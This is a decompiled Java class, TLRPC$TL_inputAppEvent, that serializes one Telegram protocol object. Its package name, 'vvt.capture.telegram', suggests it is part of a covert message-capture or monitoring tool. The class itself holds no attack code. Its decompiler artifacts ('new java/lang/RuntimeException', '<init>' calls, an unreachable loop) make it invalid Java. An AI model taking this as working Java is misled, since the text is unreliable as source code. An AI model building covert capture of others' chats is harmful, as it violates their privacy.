package com.vvt.capture.telegram.internal;

public class TLRPC$TL_inputAppEvent
  extends TLObject
{
  public static int constructor = 1996904104;
  public String data;
  public long peer;
  public double time;
  public String type;
  
  public static TL_inputAppEvent TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    int i = constructor;
    Object localObject;
    if (i != paramInt)
    {
      if (paramBoolean)
      {
        localObject = new java/lang/RuntimeException;
        Object[] arrayOfObject = new Object[1];
        Integer localInteger = Integer.valueOf(paramInt);
        arrayOfObject[0] = localInteger;
        String str = String.format("can't parse magic %x in TL_inputAppEvent", arrayOfObject);
        ((RuntimeException)localObject).<init>(str);
        throw ((Throwable)localObject);
      }
      i = 0;
      localObject = null;
    }
    for (;;)
    {
      return (TL_inputAppEvent)localObject;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_inputAppEvent;
      ((TL_inputAppEvent)localObject).<init>();
      ((TL_inputAppEvent)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
  }
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    double d = paramAbstractSerializedData.readDouble(paramBoolean);
    this.time = d;
    String str = paramAbstractSerializedData.readString(paramBoolean);
    this.type = str;
    long l = paramAbstractSerializedData.readInt64(paramBoolean);
    this.peer = l;
    str = paramAbstractSerializedData.readString(paramBoolean);
    this.data = str;
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    double d = this.time;
    paramAbstractSerializedData.writeDouble(d);
    String str = this.type;
    paramAbstractSerializedData.writeString(str);
    long l = this.peer;
    paramAbstractSerializedData.writeInt64(l);
    str = this.data;
    paramAbstractSerializedData.writeString(str);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_inputAppEvent.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */